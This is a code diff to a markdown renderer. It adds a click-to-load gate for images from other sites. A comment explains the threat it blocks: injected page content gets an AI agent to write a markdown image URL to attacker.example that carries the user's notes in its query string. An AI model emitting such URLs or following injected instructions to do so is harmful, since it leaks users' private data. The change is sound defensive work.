@@ -119,6 +119,44 @@ const customStyle = {
   },
 };
 
+/** Same origin, inline (data:) or local (blob:): loading it tells nobody anything. */
+export function isLocalImage(src: string, base: string = window.location.href): boolean {
+  if (/^(data|blob):/i.test(src)) return true;
+  try {
+    return new URL(src, base).origin === new URL(base).origin;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * An image from another site loads only when clicked. Rendering it would
+ * fetch its URL the moment a message or note appears, and a URL can carry data
+ * out: a page that tricks the agent into writing
+ * ![x](https://attacker.example/p.png?d=<your notes>) gets the notes without
+ * anyone clicking anything. Email clients block remote images for the same
+ * reason.
+ */
+function RemoteImageGate({ src, alt }: { src: string; alt: string }) {
+  const [load, setLoad] = useState(false);
+  if (!src) return null;
+  if (load || isLocalImage(src)) {
+    return <img src={src} alt={alt} className="my-2 max-w-full rounded" loading="lazy" referrerPolicy="no-referrer" />;
+  }
+  let host = src;
+  try { host = new URL(src).host; } catch { /* keep the raw text */ }
+  return (
+    <button
+      type="button"
+      onClick={() => setLoad(true)}
+      title={src}
+      className="my-1 inline-flex items-center gap-1 rounded border border-dashed border-gray-300 px-2 py-1 text-xs text-gray-600 hover:bg-gray-50 dark:border-gray-600 dark:text-gray-300 dark:hover:bg-gray-800"
+    >
+      Image{alt ? ` “${alt}”` : ''} from {host} — click to load
+    </button>
+  );
+}
+
 function MermaidDiagram({ code, darkMode }: { code: string; darkMode?: boolean }) {
   const id = useId().replace(/:/g, '_');
   const containerRef = useRef<HTMLDivElement>(null);
@@ -363,6 +401,9 @@ function MarkdownBody({ content, className, darkMode: darkModeProp, onToggleTask
         // Pre wraps code blocks - let the code component handle styling
         pre: ({ children }) => <>{children}</>,
         
+        // Images from other sites load on a click (see RemoteImageGate).
+        img: ({ src, alt }) => <RemoteImageGate src={typeof src === 'string' ? src : ''} alt={alt ?? ''} />,
+
         // Links
         a: ({ href, children }) => (
           <a
